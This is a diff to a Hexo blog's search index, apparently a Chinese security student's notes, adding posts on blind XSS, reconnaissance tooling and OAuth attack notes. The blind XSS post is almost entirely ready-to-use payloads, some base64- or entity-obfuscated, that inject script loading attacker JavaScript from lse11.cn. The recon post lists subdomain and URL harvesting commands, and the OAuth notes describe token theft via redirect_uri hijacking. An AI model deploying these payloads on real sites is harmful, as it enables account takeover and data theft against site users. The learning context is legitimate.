@@ -4,6 +4,32 @@
   
     
     <entry>
+      <title>盲xss</title>
+      <link href="/2025/11/05/%E7%9B%B2xss/"/>
+      <url>/2025/11/05/%E7%9B%B2xss/</url>
+      
+        <content type="html"><![CDATA[<h1 id="https-conote-xsslse-xyz-xss"><a href="#https-conote-xsslse-xyz-xss" class="headerlink" title="https://conote.xsslse.xyz/xss"></a><a href="https://conote.xsslse.xyz/xss">https://conote.xsslse.xyz/xss</a></h1><p>conote+飞书通知<br>payload如下<br>Import:<br>Script:<br>Input:<br>Img:<br>Video:<br>IFrame:<br>XMLHTTP:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=&#x27;z&#x27; onerror=import(&#x27;https://lse11.cn/Kq8Snzf8.js?n=0d1a98&#x27;)&gt;</span><br><span class="line">&quot;&gt;&lt;script src=https://lse11.cn/Kq8Snzf8.js?n=0d1a98&gt;&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbHNlMTEuY24vS3E4U256ZjguanM/bj0wZDFhOTgiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus&gt;</span><br><span class="line">&quot;&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbHNlMTEuY24vS3E4U256ZjguanM/bj0wZDFhOTgiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&gt;</span><br><span class="line">&quot;&gt;&lt;video&gt;&lt;source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vbHNlMTEuY24vS3E4U256ZjguanM/bj0wZDFhOTgiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&gt;</span><br><span class="line">&quot;&gt;&lt;iframe srcdoc=&quot;&amp;#0000060;&amp;#0000115;&amp;#0000099;&amp;#0000114;&amp;#0000105;&amp;#0000112;&amp;#0000116;&amp;#0000062;&amp;#0000118;&amp;#0000097;&amp;#0000114;&amp;#0000032;&amp;#0000097;&amp;#0000061;&amp;#0000112;&amp;#0000097;&amp;#0000114;&amp;#0000101;&amp;#0000110;&amp;#0000116;&amp;#0000046;&amp;#0000100;&amp;#0000111;&amp;#0000099;&amp;#0000117;&amp;#0000109;&amp;#0000101;&amp;#0000110;&amp;#0000116;&amp;#0000046;&amp;#0000099;&amp;#0000114;&amp;#0000101;&amp;#0000097;&amp;#0000116;&amp;#0000101;&amp;#0000069;&amp;#0000108;&amp;#0000101;&amp;#0000109;&amp;#0000101;&amp;#0000110;&amp;#0000116;&amp;#0000040;&amp;#0000034;&amp;#0000115;&amp;#0000099;&amp;#0000114;&amp;#0000105;&amp;#0000112;&amp;#0000116;&amp;#0000034;&amp;#0000041;&amp;#0000059;&amp;#0000097;&amp;#0000046;&amp;#0000115;&amp;#0000114;&amp;#0000099;&amp;#0000061;&amp;#0000034;&amp;#0000104;&amp;#0000116;&amp;#0000116;&amp;#0000112;&amp;#0000115;&amp;#0000058;&amp;#0000047;&amp;#0000047;&amp;#0000108;&amp;#0000115;&amp;#0000101;&amp;#0000049;&amp;#0000049;&amp;#0000046;&amp;#0000099;&amp;#0000110;&amp;#0000047;&amp;#0000075;&amp;#0000113;&amp;#0000056;&amp;#0000083;&amp;#0000110;&amp;#0000122;&amp;#0000102;&amp;#0000056;&amp;#0000046;&amp;#0000106;&amp;#0000115;&amp;#0000063;&amp;#0000110;&amp;#0000061;&amp;#0000048;&amp;#0000100;&amp;#0000049;&amp;#0000097;&amp;#0000057;&amp;#0000056;&amp;#0000034;&amp;#0000059;&amp;#0000112;&amp;#0000097;&amp;#0000114;&amp;#0000101;&amp;#0000110;&amp;#0000116;&amp;#0000046;&amp;#0000100;&amp;#0000111;&amp;#0000099;&amp;#0000117;&amp;#0000109;&amp;#0000101;&amp;#0000110;&amp;#0000116;&amp;#0000046;&amp;#0000098;&amp;#0000111;&amp;#0000100;&amp;#0000121;&amp;#0000046;&amp;#0000097;&amp;#0000112;&amp;#0000112;&amp;#0000101;&amp;#0000110;&amp;#0000100;&amp;#0000067;&amp;#0000104;&amp;#0000105;&amp;#0000108;&amp;#0000100;&amp;#0000040;&amp;#0000097;&amp;#0000041;&amp;#0000059;&amp;#0000060;&amp;#0000047;&amp;#0000115;&amp;#0000099;&amp;#0000114;&amp;#0000105;&amp;#0000112;&amp;#0000116;&amp;#0000062;&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JS-URI"><a href="#JS-URI" class="headerlink" title="JS-URI:"></a>JS-URI:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:eval(&#x27;var a=document.createElement(\&#x27;script\&#x27;);a.src=\&#x27;https://lse11.cn/Kq8Snzf8.js?n=0d1a98\&#x27;;document.body.appendChild(a)&#x27;)</span><br></pre></td></tr></table></figure><h2 id="JQuery"><a href="#JQuery" class="headerlink" title="JQuery:"></a>JQuery:</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;<span class="built_in">eval</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)&#125;;a=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();a.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, b);a.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;//lse11.cn/Kq8Snzf8.js?n=0d1a98&quot;</span>);a.<span class="title function_">send</span>();&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">getScript</span>(<span class="string">&quot;//lse11.cn/Kq8Snzf8.js?n=0d1a98&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>信息收集</title>
+      <link href="/2025/11/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+      <url>/2025/11/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<h1 id="子域名-探活"><a href="#子域名-探活" class="headerlink" title="子域名+探活"></a>子域名+探活</h1><p>subfinder<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subfinder -dL domain.txt -all &gt;&gt; domians1.txt</span><br></pre></td></tr></table></figure></p><p>oneforall<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --targets domain.txt run</span><br></pre></td></tr></table></figure></p><p>httpx<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat all_domains.txt|httpx -ports 80,443,8080,8000,8888,8443 -sc -title -mc 200,404,403,302 -threads 200 |tee subdomains_alive.txt</span><br></pre></td></tr></table></figure><br>Tscan截图</p><p>渗透时naabu发现非80，443的web端口<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="url收集"><a href="#url收集" class="headerlink" title="url收集"></a>url收集</h1><h2 id="被动收集"><a href="#被动收集" class="headerlink" title="被动收集"></a>被动收集</h2><h3 id="gau-our"><a href="#gau-our" class="headerlink" title="gau+our"></a>gau+our</h3><p>gau容易被ban<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat livesubdomains.txt | gau | sort -u &gt; urls2.txt</span><br></pre></td></tr></table></figure></p><h3 id="VirusTotal-sh-our"><a href="#VirusTotal-sh-our" class="headerlink" title="VirusTotal.sh+our"></a>VirusTotal.sh+our</h3><p><a href="https://github.com/coffinxp/scripts/blob/main/virustotal.sh">https://github.com/coffinxp/scripts/blob/main/virustotal.sh</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>GraphQL</title>
       <link href="/2025/10/31/GraphQL/"/>
       <url>/2025/10/31/GraphQL/</url>
@@ -34,7 +60,7 @@
       <link href="/2025/10/27/OAuth2-0%E8%AE%A4%E8%AF%81%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%A8%81%E8%83%81/"/>
       <url>/2025/10/27/OAuth2-0%E8%AE%A4%E8%AF%81%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%A8%81%E8%83%81/</url>
       
-        <content type="html"><![CDATA[<h1 id="什么是OAuth2-0认证"><a href="#什么是OAuth2-0认证" class="headerlink" title="什么是OAuth2.0认证"></a>什么是OAuth2.0认证</h1><p>OAuth2.0其实就是第三方登陆的一种授权类型，其给授权流程定义了一个标准。</p><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1><h1 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h1>]]></content>
+        <content type="html"><![CDATA[<h1 id="什么是OAuth2-0认证"><a href="#什么是OAuth2-0认证" class="headerlink" title="什么是OAuth2.0认证"></a>什么是OAuth2.0认证</h1><p>OAuth2.0其实就是第三方登陆的一种授权类型，其给授权流程定义了一个标准。</p><h1 id="Oauth的流程与种类"><a href="#Oauth的流程与种类" class="headerlink" title="Oauth的流程与种类"></a>Oauth的流程与种类</h1><h2 id="隐式"><a href="#隐式" class="headerlink" title="隐式"></a>隐式</h2><h1 id=""><a href="#" class="headerlink" title="#"></a>#</h1><h1 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h1><h1 id="识别OAuth认证与OAuth的攻击注意"><a href="#识别OAuth认证与OAuth的攻击注意" class="headerlink" title="识别OAuth认证与OAuth的攻击注意"></a>识别OAuth认证与OAuth的攻击注意</h1><p>一般Oauth登陆的文章再文件进入时会向授权服务端发送类似如下的请求<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://xxxx.xx/auth?client_id=12345&amp;redirect_uri=https://client-app.com/callback&amp;response_type=token&amp;scope=openid%20profile&amp;state=ae13d489bd00e3c24 HTTP/1.1</span><br><span class="line">Host: oauth-authorization-server.com</span><br></pre></td></tr></table></figure><br>当然参数不止有如上的两个还有很多，但是一般都会包含着两个参数<br>再发现服务端时我们可以尝试服务如下路径来尝试查看其配置文件<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/.well-known/oauth-authorization-server</span><br><span class="line">/.well-known/openid-configuration</span><br></pre></td></tr></table></figure></p><h1 id="靶场：通过OAuth隐式流程绕过认证"><a href="#靶场：通过OAuth隐式流程绕过认证" class="headerlink" title="靶场：通过OAuth隐式流程绕过认证"></a>靶场：通过OAuth隐式流程绕过认证</h1><p>其实这个靶场更加类似于idor。<br>首先隐式流程会将中间的session直接返回前端而不是客户端的后端，着导致其任意被浏览器插件之类的劫持，所以相对不安全，目前也没有几个使用隐式流程的Oauth了。</p><h1 id="通过OpenID注册导致的ssrf"><a href="#通过OpenID注册导致的ssrf" class="headerlink" title="通过OpenID注册导致的ssrf"></a>通过OpenID注册导致的ssrf</h1><h1 id="CSRF保护有缺陷"><a href="#CSRF保护有缺陷" class="headerlink" title="CSRF保护有缺陷"></a>CSRF保护有缺陷</h1><h1 id="OAuth账户被redirect-uri劫持"><a href="#OAuth账户被redirect-uri劫持" class="headerlink" title="OAuth账户被redirect_uri劫持"></a>OAuth账户被redirect_uri劫持</h1><p>redirect_uri就是一个重定向标识，当这个标识服务端并没有验证其合法性可以进行篡改时就会造成服务端会将最后的token重定向到攻击者定义的redirect_uri从而造成redirect_uri被篡改。</p><p>这个威胁再绝大多数常见下其实只要被登陆态的用户点击一下就会造成token的劫持。因为登陆态的用户一般都会再浏览器中存储下oauth验证流程的中间session从而自动跳过密码输入，重新生成一个token然后重定向到redirect_uri从而将token泄露。造成1点击账号劫持，如果这个平台是个可以发送帖子的平台且存在iframe表单的html注入那么久会造成0点击账号劫持</p><h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h1 id="通过代理页面窃取代码和访问令牌"><a href="#通过代理页面窃取代码和访问令牌" class="headerlink" title="通过代理页面窃取代码和访问令牌"></a>通过代理页面窃取代码和访问令牌</h1><h2 id="通过开放重定向"><a href="#通过开放重定向" class="headerlink" title="通过开放重定向"></a>通过开放重定向</h2><h2 id="通过xss，html注入等"><a href="#通过xss，html注入等" class="headerlink" title="通过xss，html注入等"></a>通过xss，html注入等</h2>]]></content>
       
       
       
@@ -3533,9 +3559,31 @@
     
     
     <entry>
-      <title>这就是（一个平平无奇的大学生的）分类</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
+      <title></title>
+      <link href="/css/modify.css"/>
+      <url>/css/modify.css</url>
+      
+        <content type="html"><![CDATA[#page-header {  background: transparent !important;}#page-header.post-bg,#page-header.not-home-page {  height: 280px !important;}#page-header #post-info {  bottom: 40px !important;  text-align: center;}#page-header #page-site-info {  top: 140px !important;}@media screen and (max-width: 768px) {  #page-header.not-home-page {    height: 200px !important;  }  #page-header #post-info {    bottom: 10px !important;  }  #page-header #page-site-info {    top: 100px !important;  }}.top-img {  height: 250px;  margin: -50px -40px 50px;  border-top-left-radius: inherit;  border-top-right-radius: inherit;  background-position: center center;  background-size: cover;  -webkit-transition: all 0.3s;  -moz-transition: all 0.3s;  -o-transition: all 0.3s;  -ms-transition: all 0.3s;  transition: all 0.3s;}@media screen and (max-width: 768px) {  .top-img {    height: 230px;    margin: -36px -14px 36px;  }}[data-theme='dark'] .top-img {  filter: brightness(0.8);}#footer:before {  background-color: rgba(255,255,255,0.5);}[data-theme='dark'] #footer:before {  background-color: rgba(0,0,0,0.5);}#footer-wrap,#footer-wrap a {  color: #111;  -webkit-transition: unset;  -moz-transition: unset;  -o-transition: unset;  -ms-transition: unset;  transition: unset;}[data-theme='dark'] #footer-wrap,[data-theme='dark'] #footer-wrap a {  color: var(--light-grey);}]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/baidu_verify_codeva-t6Y9fshzlA.html"/>
+      <url>/baidu_verify_codeva-t6Y9fshzlA.html</url>
+      
+        <content type="html"><![CDATA[52a533e3b2aa22f3ce0859497b2589eb]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/css/LSE.css"/>
+      <url>/css/LSE.css</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -3555,31 +3603,9 @@
     
     
     <entry>
-      <title></title>
-      <link href="/baidu_verify_codeva-t6Y9fshzlA.html"/>
-      <url>/baidu_verify_codeva-t6Y9fshzlA.html</url>
-      
-        <content type="html"><![CDATA[52a533e3b2aa22f3ce0859497b2589eb]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/css/modify.css"/>
-      <url>/css/modify.css</url>
-      
-        <content type="html"><![CDATA[#page-header {  background: transparent !important;}#page-header.post-bg,#page-header.not-home-page {  height: 280px !important;}#page-header #post-info {  bottom: 40px !important;  text-align: center;}#page-header #page-site-info {  top: 140px !important;}@media screen and (max-width: 768px) {  #page-header.not-home-page {    height: 200px !important;  }  #page-header #post-info {    bottom: 10px !important;  }  #page-header #page-site-info {    top: 100px !important;  }}.top-img {  height: 250px;  margin: -50px -40px 50px;  border-top-left-radius: inherit;  border-top-right-radius: inherit;  background-position: center center;  background-size: cover;  -webkit-transition: all 0.3s;  -moz-transition: all 0.3s;  -o-transition: all 0.3s;  -ms-transition: all 0.3s;  transition: all 0.3s;}@media screen and (max-width: 768px) {  .top-img {    height: 230px;    margin: -36px -14px 36px;  }}[data-theme='dark'] .top-img {  filter: brightness(0.8);}#footer:before {  background-color: rgba(255,255,255,0.5);}[data-theme='dark'] #footer:before {  background-color: rgba(0,0,0,0.5);}#footer-wrap,#footer-wrap a {  color: #111;  -webkit-transition: unset;  -moz-transition: unset;  -o-transition: unset;  -ms-transition: unset;  transition: unset;}[data-theme='dark'] #footer-wrap,[data-theme='dark'] #footer-wrap a {  color: var(--light-grey);}]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/js/LSE.js"/>
-      <url>/js/LSE.js</url>
+      <title>这就是（一个平平无奇的大学生的）分类</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -3600,8 +3626,19 @@
     
     <entry>
       <title></title>
-      <link href="/css/LSE.css"/>
-      <url>/css/LSE.css</url>
+      <link href="/scripts/modify.js"/>
+      <url>/scripts/modify.js</url>
+      
+        <content type="html"><![CDATA['use strict';const { filter } = hexo.extend;const cheerio = require('cheerio');/** * 在页面插入新顶部图 * @param {cheerio.Root} $ Root */function insertTopImg($) {    const header = $('#page-header');    if (header.length === 0) return;    const background = header.css('background-image');    if (!background) return;    $('#post, #page, #archive, #tag, #category').prepend(`<div class="top-img" style="background-image: ${background};"></div>`);}// 修改 HTMLfilter.register('after_render:html', (str, data) => {    const $ = cheerio.load(str, {        decodeEntities: false    });    insertTopImg($);    return $.html();});]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/js/LSE.js"/>
+      <url>/js/LSE.js</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -3615,17 +3652,6 @@
       <url>/link/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/scripts/modify.js"/>
-      <url>/scripts/modify.js</url>
-      
-        <content type="html"><![CDATA['use strict';const { filter } = hexo.extend;const cheerio = require('cheerio');/** * 在页面插入新顶部图 * @param {cheerio.Root} $ Root */function insertTopImg($) {    const header = $('#page-header');    if (header.length === 0) return;    const background = header.css('background-image');    if (!background) return;    $('#post, #page, #archive, #tag, #category').prepend(`<div class="top-img" style="background-image: ${background};"></div>`);}// 修改 HTMLfilter.register('after_render:html', (str, data) => {    const $ = cheerio.load(str, {        decodeEntities: false    });    insertTopImg($);    return $.html();});]]></content>
       
     </entry>
     
